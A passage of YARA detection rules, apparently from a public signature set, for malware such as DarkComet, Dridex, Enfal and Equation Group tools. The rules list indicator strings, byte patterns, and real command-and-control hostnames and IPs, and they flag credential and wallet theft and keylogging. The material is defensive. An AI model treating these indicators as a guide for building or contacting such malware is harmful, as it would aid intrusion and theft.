        4 of ($bot*) or all of ($ddos*) or all of ($keylogger*) or all of ($shell*)
}

rule DarkComet_2 : rat
{
	meta:
		description = "DarkComet" 
		author = "Jean-Philippe Teissier / @Jipe_"
		date = "2013-01-12"
		filetype = "memory"
		version = "1.0" 

	strings:
		$a = "#BEGIN DARKCOMET DATA --"
		$b = "#EOF DARKCOMET DATA --"
		$c = "DC_MUTEX-"
		$k1 = "#KCMDDC5#-890"
		$k2 = "#KCMDDC51#-890"

	condition:
		any of them
}
rule DarkComet_3
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/DarkComet"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		// Versions 2x
		$a1 = "#BOT#URLUpdate"
		$a2 = "Command successfully executed!"
		$a3 = "MUTEXNAME" wide
		$a4 = "NETDATA" wide
		// Versions 3x & 4x & 5x
		$b1 = "FastMM Borland Edition"
		$b2 = "%s, ClassID: %s"
		$b3 = "I wasn't able to open the hosts file"
		$b4 = "#BOT#VisitUrl"
		$b5 = "#KCMDDC"
	condition:
		all of ($a*) or all of ($b*)
}

rule DarkComet_Keylogger_File
{
	meta:
		author = "Florian Roth"
		description = "Looks like a keylogger file created by DarkComet Malware"
		date = "25.07.14"
		reference = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
		score = 50
	strings:
		$magic = "::"
		$entry = /\n:: [A-Z]/
		$timestamp = /\([0-9]?[0-9]:[0-9][0-9]:[0-9][0-9] [AP]M\)/
	condition:
		($magic at 0) and #entry > 10 and #timestamp > 10
}
rule DarkComet_4
{	meta:
		reference = "https://github.com/bwall/bamfdetect/blob/master/BAMF_Detect/modules/yara/darkcomet.yara"
	strings:
	    $a1 = "#BOT#"
	    $a2 = "WEBCAMSTOP"
	    $a3 = "UnActiveOnlineKeyStrokes"
	    $a4 = "#SendTaskMgr"
	    $a5 = "#RemoteScreenSize"
	    $a6 = "ping 127.0.0.1 -n 4 > NUL &&"
	condition:
		all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule DDosTf : DDoS
{
  meta:
    author = "benkow_ - MalwareMustDie"
    reference = "http://blog.malwaremustdie.org/2016/01/mmd-0048-2016-ddostf-new-elf-windows.html"
    description = "Rule to detect ELF.DDosTf infection"
  strings:
    $st0 = "ddos.tf"
    $st1 = {E8 AE BE E7 BD AE 54 43  50 5F 4B 45 45 50 49 4E 54 56 4C E9 94 99 E8 AF AF EF BC 9A 00} /*TCP_KEEPINTVL*/
    $st2 = {E8 AE BE E7 BD AE 54 43  50 5F 4B 45 45 50 43 4E 54 E9 94 99 E8 AF AF EF BC 9A 00} /*TCP_KEEPCNT*/
    $st3 = "Accept-Language: zh"
    $st4 = "%d Kb/bps|%d%%"
   
  condition:
    all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule Derkziel
{
    meta:
        description = "Derkziel info stealer (Steam, Opera, Yandex, ...)"
        author = "The Malware Hunter"
        yaraexchange = "No distribution without author's consent"
        filetype = "pe"
        date = "2015-11"
        md5 = "f5956953b7a4acab2e6fa478c0015972"
        site = "https://zoo.mlw.re/samples/f5956953b7a4acab2e6fa478c0015972"
        reference = "https://bhf.su/threads/137898/"
    strings:
        $drz = "{!}DRZ{!}"
        $ua = "User-Agent: Uploador"
        $steam = "SteamAppData.vdf"
        $login = "loginusers.vdf"
        $config = "config.vdf"
    condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Dexter_Malware {
	meta:
		description = "Detects the Dexter Trojan/Agent http://goo.gl/oBvy8b"
		author = "Florian Roth"
		reference = "http://goo.gl/oBvy8b"
		date = "2015/02/10"
		score = 70
	strings:
		$s0 = "Java Security Plugin" fullword wide
		$s1 = "%s\\%s\\%s.exe" fullword wide
		$s2 = "Sun Java Security Plugin" fullword wide
		$s3 = "\\Internet Explorer\\iexplore.exe" fullword wide
	condition:
		all of them
}
rule dexter_strings
{
    meta:
        author = "Brian Wallace @botnet_hunter"
        author_email = "bwall@ballastsecurity.net"
        date = "2014-09-10"
        description = "Identify Dexter POSGrabber"
    strings:
        $s1 = "UpdateMutex:"
        $s2 = "response="
        $s3 = "page="
        $s4 = "scanin:"
    condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as
    long as you use it under this license.
*/
rule diamond_fox
{
    meta:
        author = "Brian Wallace @botnet_hunter"
        author_email = "bwall@ballastsecurity.net"
        date = "2015-08-22"
        description = "Identify DiamondFox"
    strings:
    	$s1 = "UPDATE_B"
        $s2 = "UNISTALL_B"
        $s3 = "S_PROTECT"
        $s4 = "P_WALLET"
        $s5 = "GR_COMMAND"
        $s6 = "FTPUPLOAD"
    condition:
    	all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-12-02
	Identifier: Phishing Gina Harrowell Dez 2015
*/

rule PHISH_02Dez2015_dropped_p0o6543f {
	meta:
		description = "Phishing Wave - file p0o6543f.exe"
		author = "Florian Roth"
		reference = "http://myonlinesecurity.co.uk/purchase-order-124658-gina-harrowell-clinimed-limited-word-doc-or-excel-xls-spreadsheet-malware/"
		date = "2015-12-02"
		hash = "db788d6d3a8ed1a6dc9626852587f475e7671e12fa9c9faa73b7277886f1e210"
	strings:
		$s1 = "netsh.exe" fullword wide
		$s2 = "routemon.exe" fullword wide
		$s3 = "script=" fullword wide /* Goodware String - occured 4 times */
		$s4 = "disconnect" fullword wide /* Goodware String - occured 14 times */
		$s5 = "GetClusterResourceTypeKey" fullword ascii /* Goodware String - occured 17 times */
		$s6 = "QueryInformationJobObject" fullword ascii /* Goodware String - occured 34 times */
		$s7 = "interface" fullword wide /* Goodware String - occured 52 times */
		$s8 = "connect" fullword wide /* Goodware String - occured 61 times */
		$s9 = "FreeConsole" fullword ascii /* Goodware String - occured 91 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 250KB and all of them
}

rule PHISH_02Dez2015_attach_P_ORD_C_10156_124658 {
	meta:
		description = "Phishing Wave - file P-ORD-C-10156-124658.xls"
		author = "Florian Roth"
		reference = "http://myonlinesecurity.co.uk/purchase-order-124658-gina-harrowell-clinimed-limited-word-doc-or-excel-xls-spreadsheet-malware/"
		date = "2015-12-02"
		hash = "bc252ede5302240c2fef8bc0291ad5a227906b4e70929a737792e935a5fee209"
	strings:
		$s1 = "Execute" ascii
		$s2 = "Process WriteParameterFiles" fullword ascii
		$s3 = "WScript.Shell" fullword ascii
		$s4 = "STOCKMASTER" fullword ascii
		$s5 = "InsertEmailFax" ascii
	condition:
		uint16(0) == 0xcfd0 and filesize < 200KB and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Dridex_Trojan_XML {
	meta:
		description = "Dridex Malware in XML Document"
		author = "Florian Roth @4nc4p"
		reference = "https://threatpost.com/dridex-banking-trojan-spreading-via-macros-in-xml-files/111503"
		date = "2015/03/08"
		hash1 = "88d98e18ed996986d26ce4149ae9b2faee0bc082"
		hash2 = "3b2d59adadf5ff10829bb5c27961b22611676395"
		hash3 = "e528671b1b32b3fa2134a088bfab1ba46b468514"
		hash4 = "981369cd53c022b434ee6d380aa9884459b63350"
		hash5 = "96e1e7383457293a9b8f2c75270b58da0e630bea"
	strings:
		// can be ascii or wide formatted - therefore no restriction
		$c_xml      = "<?xml version="
		$c_word     = "<?mso-application progid=\"Word.Document\"?>"
		$c_macro    = "w:macrosPresent=\"yes\""
		$c_binary   = "<w:binData w:name="
		$c_0_chars  = "<o:Characters>0</o:Characters>"
		$c_1_line   = "<o:Lines>1</o:Lines>"
	condition:
		all of ($c*)
}
rule dubrute : bruteforcer
{
    meta:
        author = "Christian Rebischke (@sh1bumi)"
        date = "2015-09-05"
        description = "Rules for DuBrute Bruteforcer"
        in_the_wild = true
        family = "Hackingtool/Bruteforcer"
    
    strings:
        $a = "WBrute"
        $b = "error.txt"
        $c = "good.txt"
        $d = "source.txt"
        $e = "bad.txt"
        $f = "Generator IP@Login;Password"

    condition:
        //check for MZ Signature at offset 0
        uint16(0) == 0x5A4D 

        and 

        //check for dubrute specific strings
        $a and $b and $c and $d and $e and $f 
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule EnfalCode : Enfal Family 
{
    meta:
        description = "Enfal code tricks"
        author = "Seth Hardy"
        last_modified = "2014-06-19"
        
    strings:
        // mov al, 20h; sub al, bl; add [ebx+esi], al; push esi; inc ebx; call edi; cmp ebx, eax
        $decrypt = { B0 20 2A C3 00 04 33 56 43 FF D7 3B D8 }
        
    condition:
        any of them
}

rule EnfalStrings : Enfal Family
{
    meta:
        description = "Enfal Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-19"
        
    strings:
        $ = "D:\\work\\\xe6\xba\x90\xe5\x93\xa5\xe5\x85\x8d\xe6\x9d\x80\\tmp\\Release\\ServiceDll.pdb"
        $ = "e:\\programs\\LuridDownLoader"
        $ = "LuridDownloader for Falcon"
        $ = "DllServiceTrojan"
        $ = "\\k\\\xe6\xa1\x8c\xe8\x9d\xa2\\"
        $ = "EtenFalcon\xef\xbc\x88\xe4\xbf\xae\xe6\x94\xb9\xef\xbc\x89"
        $ = "Madonna\x00Jesus"
        $ = "/iupw82/netstate"
        $ = "fuckNodAgain"
        $ = "iloudermao"
        $ = "Crpq2.cgi"
        $ = "Clnpp5.cgi"
        $ = "Dqpq3ll.cgi"
        $ = "dieosn83.cgi"
        $ = "Rwpq1.cgi"
        $ = "/Ccmwhite"
        $ = "/Cmwhite"
        $ = "/Crpwhite"
        $ = "/Dfwhite"
        $ = "/Query.txt"
        $ = "/Ufwhite"
        $ = "/cgl-bin/Clnpp5.cgi"
        $ = "/cgl-bin/Crpq2.cgi"
        $ = "/cgl-bin/Dwpq3ll.cgi"
        $ = "/cgl-bin/Owpq4.cgi"
        $ = "/cgl-bin/Rwpq1.cgi"
        $ = "/trandocs/mm/"
        $ = "/trandocs/netstat"
        $ = "NFal.exe"
        $ = "LINLINVMAN"
        $ = "7NFP4R9W"
        
    condition:
        any of them
}

rule Enfal : Family
{
    meta:
        description = "Enfal"
        author = "Seth Hardy"
        last_modified = "2014-06-19"
        
    condition:
        EnfalCode or EnfalStrings
}


rule Enfal_Malware {
	meta:
		description = "Detects a certain type of Enfal Malware"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/02/10"
		hash = "9639ec9aca4011b2724d8e7ddd13db19913e3e16"
		score = 60
	strings:
		$s0 = "POWERPNT.exe" fullword ascii
		$s1 = "%APPDATA%\\Microsoft\\Windows\\" fullword ascii
		$s2 = "%HOMEPATH%" fullword ascii
		$s3 = "Server2008" fullword ascii
		$s4 = "Server2003" fullword ascii
		$s5 = "Server2003R2" fullword ascii
		$s6 = "Server2008R2" fullword ascii
		$s9 = "%HOMEDRIVE%" fullword ascii
		$s13 = "%ComSpec%" fullword ascii
	condition:
		all of them
}

rule Enfal_Malware_Backdoor {
	meta:
		description = "Generic Rule to detect the Enfal Malware"
		author = "Florian Roth"
		date = "2015/02/10"
		super_rule = 1
		hash0 = "6d484daba3927fc0744b1bbd7981a56ebef95790"
		hash1 = "d4071272cc1bf944e3867db299b3f5dce126f82b"
		hash2 = "6c7c8b804cc76e2c208c6e3b6453cb134d01fa41"
		score = 60
	strings:
		$mz = { 4d 5a }
			
		$x1 = "Micorsoft Corportation" fullword wide
		$x2 = "IM Monnitor Service" fullword wide
		
		$s1 = "imemonsvc.dll" fullword wide
		$s2 = "iphlpsvc.tmp" fullword
		
		$z1 = "urlmon" fullword
		$z2 = "Registered trademarks and service marks are the property of their respec" wide		
		$z3 = "XpsUnregisterServer" fullword
		$z4 = "XpsRegisterServer" fullword
		$z5 = "{53A4988C-F91F-4054-9076-220AC5EC03F3}" fullword
	condition:
		( $mz at 0 ) and 
		( 
			1 of ($x*) or 
			( all of ($s*) and all of ($z*) )
		)
}
rule ce_enfal_cmstar_debug_msg
{
    meta:
        Author      = "rfalcone"
        Date        = "2015.05.10"
        Description = "Detects the static debug strings within CMSTAR"
        Reference   = "http://researchcenter.paloaltonetworks.com/2015/05/cmstar-downloader-lurid-and-enfals-new-cousin"

    strings:
        $d1 = "EEE\x0d\x0a" fullword
        $d2 = "TKE\x0d\x0a" fullword
        $d3 = "VPE\x0d\x0a" fullword
        $d4 = "VPS\x0d\x0a" fullword
        $d5 = "WFSE\x0d\x0a" fullword
        $d6 = "WFSS\x0d\x0a" fullword
        $d7 = "CM**\x0d\x0a" fullword

    condition:
        uint16(0) == 0x5a4d and all of ($d*)
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

/* Equation APT ------------------------------------------------------------ */

rule apt_equation_exploitlib_mutexes {
    meta:
        copyright = "Kaspersky Lab"
        description = "Rule to detect Equation group's Exploitation libmalware_rary http://goo.gl/ivt8EW"
        version = "1.0"
        last_modified = "2015-02-16"
        reference = "http://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/"
    strings:
        $mz="MZ"
        $a1="prkMtx" wide
        $a2="cnFormSyncExFBC" wide
        $a3="cnFormVoidFBC" wide
        $a4="cnFormSyncExFBC"
        $a5="cnFormVoidFBC"
    condition:
        (($mz at 0) and any of ($a*))
}

rule apt_equation_doublefantasy_genericresource {
    meta:
        copyright = "Kaspersky Lab"
        description = "Rule to detect DoubleFantasy encoded config http://goo.gl/ivt8EW"
        version = "1.0"
        last_modified = "2015-02-16"
        reference = "http://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/"
    strings:
        $mz="MZ"
        $a1={06 00 42 00 49 00 4E 00 52 00 45 00 53 00}
        $a2="yyyyyyyyyyyyyyyy"
        $a3="002"
    condition:
        (($mz at 0) and all of ($a*)) and filesize < 500000
}

rule apt_equation_equationlaser_runtimeclasses {
	meta:
	    copyright = "Kaspersky Lab"
	    description = "Rule to detect the EquationLaser malware"
	    version = "1.0"
	    last_modified = "2015-02-16"
	    reference = "https://securelist.com/blog/"
	strings:
	    $a1="?a73957838_2@@YAXXZ"
	    $a2="?a84884@@YAXXZ"
	    $a3="?b823838_9839@@YAXXZ"
	    $a4="?e747383_94@@YAXXZ"
	    $a5="?e83834@@YAXXZ"
	    $a6="?e929348_827@@YAXXZ"
	condition:
	    any of them
}

rule apt_equation_cryptotable {
	meta:
	    copyright = "Kaspersky Lab"
	    description = "Rule to detect the crypto libmalware_rary used in Equation group malware"
	    version = "1.0"
	    last_modified = "2015-02-16"
	    reference = "https://securelist.com/blog/"
	strings:
	    $a={37 DF E8 B6 C7 9C 0B AE 91 EF F0 3B 90 C6 80 85 5D 19 4B 45 44 12 3C E2 0D 5C 1C 7B C4 FF D6 05 17 14 4F 03 74 1E 41 DA 8F 7D DE 7E 99 F1 35 AC B8 46 93 CE 23 82 07 EB 2B D4 72 71 40 F3 B0 F7 78 D7 4C D1 55 1A 39 83 18 FA E1 9A 56 B1 96 AB A6 30 C5 5F BE 0C 50 C1}
	condition:
	    $a
}

/* Equation Group - Kaspersky ---------------------------------------------- */

rule Equation_Kaspersky_TripleFantasy_1 {
	meta:
		description = "Equation Group Malware - TripleFantasy http://goo.gl/ivt8EW"
		author = "Florian Roth"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "b2b2cd9ca6f5864ef2ac6382b7b6374a9fb2cbe9"
	strings:
		$mz = { 4d 5a }

		$s0 = "%SystemRoot%\\system32\\hnetcfg.dll" fullword wide
		$s1 = "%WINDIR%\\System32\\ahlhcib.dll" fullword wide
		$s2 = "%WINDIR%\\sjyntmv.dat" fullword wide
		$s3 = "Global\\{8c38e4f3-591f-91cf-06a6-67b84d8a0102}" fullword wide
		$s4 = "%WINDIR%\\System32\\owrwbsdi" fullword wide
		$s5 = "Chrome" fullword wide
		$s6 = "StringIndex" fullword ascii

		$x1 = "itemagic.net@443" fullword wide
		$x2 = "team4heat.net@443" fullword wide
		$x5 = "62.216.152.69@443" fullword wide
		$x6 = "84.233.205.37@443" fullword wide

		$z1 = "www.microsoft.com@80" fullword wide
		$z2 = "www.google.com@80" fullword wide
		$z3 = "127.0.0.1:3128" fullword wide
	condition:
		( $mz at 0 ) and filesize < 300000 and
		(
			( all of ($s*) and all of ($z*) ) or
			( all of ($s*) and 1 of ($x*) )
		)
}

rule Equation_Kaspersky_DoubleFantasy_1 {
	meta:
		description = "Equation Group Malware - DoubleFantasy"
		author = "Florian Roth"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "d09b4b6d3244ac382049736ca98d7de0c6787fa2"
	strings:
		$mz = { 4d 5a }

		$z1 = "msvcp5%d.dll" fullword ascii

		$s0 = "actxprxy.GetProxyDllInfo" fullword ascii
		$s3 = "actxprxy.DllGetClassObject" fullword ascii
		$s5 = "actxprxy.DllRegisterServer" fullword ascii
		$s6 = "actxprxy.DllUnregisterServer" fullword ascii

		$x1 = "yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy" ascii
		$x2 = "191H1a1" fullword ascii
		$x3 = "November " fullword ascii
		$x4 = "abababababab" fullword ascii
		$x5 = "January " fullword ascii
		$x6 = "October " fullword ascii
		$x7 = "September " fullword ascii
	condition:
		( $mz at 0 ) and filesize < 350000 and
		(
			( $z1 ) or
			( all of ($s*) and 6 of ($x*) )
		)
}

rule Equation_Kaspersky_GROK_Keylogger {
	meta:
		description = "Equation Group Malware - GROK keylogger"
		author = "Florian Roth"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "50b8f125ed33233a545a1aac3c9d4bb6aa34b48f"
	strings:
		$mz = { 4d 5a }
		$s0 = "c:\\users\\rmgree5\\" ascii
		$s1 = "msrtdv.sys" fullword wide

		$x1 = "svrg.pdb" fullword ascii
		$x2 = "W32pServiceTable" fullword ascii
		$x3 = "In forma" fullword ascii
		$x4 = "ReleaseF" fullword ascii
		$x5 = "criptor" fullword ascii
		$x6 = "astMutex" fullword ascii
		$x7 = "ARASATAU" fullword ascii
		$x8 = "R0omp4ar" fullword ascii

		$z1 = "H.text" fullword ascii
		$z2 = "\\registry\\machine\\software\\Microsoft\\Windows NT\\CurrentVersion" fullword wide
		$z4 = "\\registry\\machine\\SYSTEM\\ControlSet001\\Control\\Session Manager\\Environment" wide fullword
	condition:
		( $mz at 0 ) and filesize < 250000 and
		(
			$s0 or
			( $s1 and 6 of ($x*) ) or
			( 6 of ($x*) and all of ($z*) )
		)
}

rule Equation_Kaspersky_GreyFishInstaller {
	meta:
		description = "Equation Group Malware - Grey Fish"
		author = "Florian Roth"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "58d15d1581f32f36542f3e9fb4b1fc84d2a6ba35"
	strings:
		$s0 = "DOGROUND.exe" fullword wide
		$s1 = "Windows Configuration Services" fullword wide
		$s2 = "GetMappedFilenameW" fullword ascii
	condition:
		all of them
}

rule Equation_Kaspersky_EquationDrugInstaller {
	meta:
		description = "Equation Group Malware - EquationDrug installer LUTEUSOBSTOS"
		author = "Florian Roth"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "61fab1b8451275c7fd580895d9c68e152ff46417"
	strings:
		$mz = { 4d 5a }

		$s0 = "\\system32\\win32k.sys" fullword wide
		$s1 = "ALL_FIREWALLS" fullword ascii

		$x1 = "@prkMtx" fullword wide
		$x2 = "STATIC" fullword wide
		$x3 = "windir" fullword wide
		$x4 = "cnFormVoidFBC" fullword wide
		$x5 = "CcnFormSyncExFBC" fullword wide
		$x6 = "WinStaObj" fullword wide
		$x7 = "BINRES" fullword wide
	condition:
		( $mz at 0 ) and filesize < 500000 and all of ($s*) and 5 of ($x*)
}

rule Equation_Kaspersky_EquationLaserInstaller {
	meta:
		description = "Equation Group Malware - EquationLaser Installer"
		author = "Florian Roth"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "5e1f56c1e57fbff96d4999db1fd6dd0f7d8221df"
	strings:
		$mz = { 4d 5a }
		$s0 = "Failed to get Windows version" fullword ascii
		$s1 = "lsasrv32.dll and lsass.exe" fullword wide
		$s2 = "\\\\%s\\mailslot\\%s" fullword ascii
		$s3 = "%d-%d-%d %d:%d:%d Z" fullword ascii
		$s4 = "lsasrv32.dll" fullword ascii
		$s5 = "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" fullword ascii
		$s6 = "%s %02x %s" fullword ascii
		$s7 = "VIEWERS" fullword ascii
		$s8 = "5.2.3790.220 (srv03_gdr.040918-1552)" fullword wide
	condition:
		( $mz at 0 ) and filesize < 250000 and 6 of ($s*)
}

rule Equation_Kaspersky_FannyWorm {
	meta:
		description = "Equation Group Malware - Fanny Worm"
		author = "Florian Roth"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "1f0ae54ac3f10d533013f74f48849de4e65817a7"
	strings:
		$mz = { 4d 5a }

		$s1 = "x:\\fanny.bmp" fullword ascii
		$s2 = "32.exe" fullword ascii
		$s3 = "d:\\fanny.bmp" fullword ascii

		$x1 = "c:\\windows\\system32\\kernel32.dll" fullword ascii
		$x2 = "System\\CurrentControlSet\\Services\\USBSTOR\\Enum" fullword ascii
		$x3 = "System\\CurrentControlSet\\Services\\PartMgr\\Enum" fullword ascii
		$x4 = "\\system32\\win32k.sys" fullword wide
		$x5 = "\\AGENTCPD.DLL" fullword ascii
		$x6 = "agentcpd.dll" fullword ascii
		$x7 = "PADupdate.exe" fullword ascii
		$x8 = "dll_installer.dll" fullword ascii
		$x9 = "\\restore\\" fullword ascii
		$x10 = "Q:\\__?__.lnk" fullword ascii
		$x11 = "Software\\Microsoft\\MSNetMng" fullword ascii
		$x12 = "\\shelldoc.dll" fullword ascii
		$x13 = "file size = %d bytes" fullword ascii
		$x14 = "\\MSAgent" fullword ascii
		$x15 = "Global\\RPCMutex" fullword ascii
		$x16 = "Global\\DirectMarketing" fullword ascii
	condition:
		( $mz at 0 ) and filesize < 300000 and
		(
			( 2 of ($s*) ) or
			( 1 of ($s*) and 6 of ($x*) ) or
			( 14 of ($x*) )
		)
}

rule Equation_Kaspersky_HDD_reprogramming_module {
	meta:
		description = "Equation Group Malware - HDD reprogramming module"
		author = "Florian Roth"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "ff2b50f371eb26f22eb8a2118e9ab0e015081500"
	strings:
		$mz = { 4d 5a }
		$s0 = "nls_933w.dll" fullword ascii

		$s1 = "BINARY" fullword wide
		$s2 = "KfAcquireSpinLock" fullword ascii
		$s3 = "HAL.dll" fullword ascii
		$s4 = "READ_REGISTER_UCHAR" fullword ascii
	condition:
		( $mz at 0 ) and filesize < 300000 and all of ($s*)
}

rule Equation_Kaspersky_EOP_Package {
	meta:
		description = "Equation Group Malware - EoP package and malware launcher"
		author = "Florian Roth"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "2bd1b1f5b4384ce802d5d32d8c8fd3d1dc04b962"
	strings:
		$mz = { 4d 5a }
		$s0 = "abababababab" fullword ascii
		$s1 = "abcdefghijklmnopq" fullword ascii
		$s2 = "@STATIC" fullword wide
		$s3 = "$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" fullword ascii
		$s4 = "@prkMtx" fullword wide
		$s5 = "prkMtx" fullword wide
		$s6 = "cnFormVoidFBC" fullword wide
	condition:
		( $mz at 0 ) and filesize < 100000 and all of ($s*)
}

rule Equation_Kaspersky_TripleFantasy_Loader {
	meta:
		description = "Equation Group Malware - TripleFantasy Loader"
		author = "Florian Roth"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "4ce6e77a11b443cc7cbe439b71bf39a39d3d7fa3"
	strings:
		$mz = { 4d 5a }

		$x1 = "Original Innovations, LLC" fullword wide
		$x2 = "Moniter Resource Protocol" fullword wide
		$x3 = "ahlhcib.dll" fullword wide

		$s0 = "hnetcfg.HNetGetSharingServicesPage" fullword ascii
		$s1 = "hnetcfg.IcfGetOperationalMode" fullword ascii
		$s2 = "hnetcfg.IcfGetDynamicFwPorts" fullword ascii
		$s3 = "hnetcfg.HNetFreeFirewallLoggingSettings" fullword ascii
		$s4 = "hnetcfg.HNetGetShareAndBridgeSettings" fullword ascii
		$s5 = "hnetcfg.HNetGetFirewallSettingsPage" fullword ascii
	condition:
		( $mz at 0 ) and filesize < 50000 and ( all of ($x*) and all of ($s*) )
}

/* Rule generated from the mentioned keywords */

rule Equation_Kaspersky_SuspiciousString {
	meta:
		description = "Equation Group Malware - suspicious string found in sample"
		author = "Florian Roth"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/17"
		score = 60
	strings:
		$mz = { 4d 5a }

		$s1 = "i386\\DesertWinterDriver.pdb" fullword
		$s2 = "Performing UR-specific post-install..."
		$s3 = "Timeout waiting for the \"canInstallNow\" event from the implant-specific EXE!"
		$s4 = "STRAITSHOOTER30.exe"
		$s5 = "standalonegrok_2.1.1.1"
		$s6 = "c:\\users\\rmgree5\\"
	condition:
		( $mz at 0 ) and filesize < 500000 and all of ($s*)
}

/* EquationDrug Update 11.03.2015 - http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/ */

rule EquationDrug_NetworkSniffer1 {
	meta:
		description = "EquationDrug - Backdoor driven by network sniffer - mstcp32.sys, fat32.sys"
		author = "Florian Roth @4nc4p"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		date = "2015/03/11"
		hash = "26e787997a338d8111d96c9a4c103cf8ff0201ce"
	strings:
		$s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
		$s1 = "\\Registry\\User\\CurrentUser\\" fullword wide
		$s3 = "sys\\mstcp32.dbg" fullword ascii
		$s7 = "mstcp32.sys" fullword wide
		$s8 = "p32.sys" fullword ascii
		$s9 = "\\Device\\%ws_%ws" fullword wide
		$s10 = "\\DosDevices\\%ws" fullword wide
		$s11 = "\\Device\\%ws" fullword wide
	condition:
		all of them
}

rule EquationDrug_CompatLayer_UnilayDLL {
	meta:
		description = "EquationDrug - Unilay.DLL"
		author = "Florian Roth @4nc4p"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		date = "2015/03/11"
		hash = "a3a31937956f161beba8acac35b96cb74241cd0f"
	strings:
		$mz = { 4d 5a }
		$s0 = "unilay.dll" fullword ascii
	condition:
		( $mz at 0 ) and $s0
}

rule EquationDrug_HDDSSD_Op {
	meta:
		description = "EquationDrug - HDD/SSD firmware operation - nls_933w.dll"
		author = "Florian Roth @4nc4p"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		date = "2015/03/11"
		hash = "ff2b50f371eb26f22eb8a2118e9ab0e015081500"
	strings:
		$s0 = "nls_933w.dll" fullword ascii
	condition:
		all of them
}

rule EquationDrug_NetworkSniffer2 {
	meta:
		description = "EquationDrug - Network Sniffer - tdip.sys"
		author = "Florian Roth @4nc4p"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		date = "2015/03/11"
		hash = "7e3cd36875c0e5ccb076eb74855d627ae8d4627f"
	strings:
		$s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
		$s1 = "IP Transport Driver" fullword wide
		$s2 = "tdip.sys" fullword wide
		$s3 = "sys\\tdip.dbg" fullword ascii
		$s4 = "dip.sys" fullword ascii
		$s5 = "\\Device\\%ws_%ws" fullword wide
		$s6 = "\\DosDevices\\%ws" fullword wide
		$s7 = "\\Device\\%ws" fullword wide
	condition:
		all of them
}

rule EquationDrug_NetworkSniffer3 {
	meta:
		description = "EquationDrug - Network Sniffer - tdip.sys"
		author = "Florian Roth @4nc4p"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		date = "2015/03/11"
		hash = "14599516381a9646cd978cf962c4f92386371040"
	strings:
		$s0 = "Corporation. All rights reserved." fullword wide
		$s1 = "IP Transport Driver" fullword wide
		$s2 = "tdip.sys" fullword wide
		$s3 = "tdip.pdb" fullword ascii
	condition:
		all of them
}

rule EquationDrug_VolRec_Driver {
	meta:
		description = "EquationDrug - Collector plugin for Volrec - msrstd.sys"
		author = "Florian Roth @4nc4p"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		date = "2015/03/11"
		hash = "ee2b504ad502dc3fed62d6483d93d9b1221cdd6c"
	strings:
		$s0 = "msrstd.sys" fullword wide
		$s1 = "msrstd.pdb" fullword ascii
		$s2 = "msrstd driver" fullword wide
	condition:
		all of them
}

rule EquationDrug_KernelRootkit {
	meta:
		description = "EquationDrug - Kernel mode stage 0 and rootkit (Windows 2000 and above) - msndsrv.sys"
		author = "Florian Roth @4nc4p"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		date = "2015/03/11"
